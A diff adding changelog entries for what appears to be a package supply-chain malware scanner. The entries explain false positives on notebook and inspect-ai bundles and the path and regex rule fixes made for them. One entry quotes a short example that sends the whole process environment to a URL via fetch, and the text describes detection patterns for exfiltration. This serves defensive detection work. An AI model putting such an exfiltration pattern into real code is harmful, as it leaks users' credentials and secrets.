@@ -977,6 +977,23 @@ aggregate):
 
 ### Fixed
 
+- **Two false positives the supply model's tree gave on benign bundles (D-20; rule set 2.75.0).** Files over
+  2,000,000 characters are the text followers' today, so neither showed; D-8's raised limit would have read them on
+  the tree. notebook 7.6.3's `notebook_core` bundle "runs code it receives over the network": JupyterLab's gettext
+  makes the plural forms its server sends a function, `Function('n', … + forms + …)`, once they pass
+  `^\s*nplurals\s*=\s*\d+\s*;\s*plural\s*=[\s\-?|&=!<>+*/%:;n0-9_()]+$`. After `if (!re.test(x)) throw` (or
+  `return`), x is clean for code when what the test lets through builds no string, reaches no property and opens
+  no block, and names at most one letter (`n`): a test that stops short of the end (gettext.js's), lets letters
+  through, or has a group, an alternation or `.` is not one, and a `RegExp(…)` is the global's unless a direct
+  `eval` or a `with` around the test could make it another name. inspect-ai 0.3.265's view bundle "reads files outside the package and sends them over the
+  network (/app-config)" and "contacts an address typical of data exfiltration (.onion)": the system folders
+  (`/app`, `/data`, `/etc` …) ended at `\b`, which holds before `-` and `.`, so the route `/app-config` was the
+  container's `/app`, and every response the view's API helper fetched a path under it, which a zip reader's
+  `readFile` then "read"; the `.onion` was linkify-it's comment, named once a send was found. A system folder now
+  ends at a separator, a quote or an interpolation, for the trees and the text followers alike (`_LD_FS_ROOT_RE`,
+  `_LD_ABSOLUTE_IN_RE`). The popular set's 1,703 releases: no verdict and no finding moved. A route under a
+  system folder (`/data/…`) would still be a path to the view's helper, whose fetch is a parameter's
+  (`customFetch ?? fetch`): its response holds what the call was given.
 - **Security: data a function hands to a callback it was given is followed (D-19; rule set 2.74.0).**
   `function withEnv(cb) { cb(JSON.stringify(process.env)); }` then `withEnv((d) => fetch(u, { method: 'POST', body:
   d }))` sends the whole environment, and a release that did so at import was OK: the supply model's tree, which
